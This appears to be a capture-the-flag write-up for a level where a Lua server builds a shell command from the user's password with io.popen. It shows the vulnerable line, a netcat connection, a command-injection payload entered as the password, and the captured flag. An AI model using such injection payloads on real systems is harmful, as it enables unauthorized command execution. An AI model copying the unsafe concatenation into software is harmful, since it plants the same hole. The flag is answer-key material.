# level11

We see a script `./level11.lua` and nothing else. We examine it and determine it does the following :

- Create a server on `localhost 5151`
- Wait for a client to connect
- Prompt the client for a password
- Hash the password
- Compare to a stored hash
- Display if the hashes are equal

One line stands out in particular :

```
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

It seems the script's way of hashing is to insert our password in a string of commands it thens feeds to a subshell. How very unsafe - and convenient for us !

We open a client to communicate with the script (it's already running, no need to start it) :

```
nc localhost 5151
```

We're prompted for a password. We try the following :

```
; getflag > /tmp/flag ; echo hello
```

If all goes well, this should concatenated and executed as `echo ; getflag > /tmp/flag ; echo hello | sha1sum`.

## The flag

We run `cat /tmp/flag` and find the flag waiting for us :

```
fa6v5ateaw21peobuub8ipe6s
```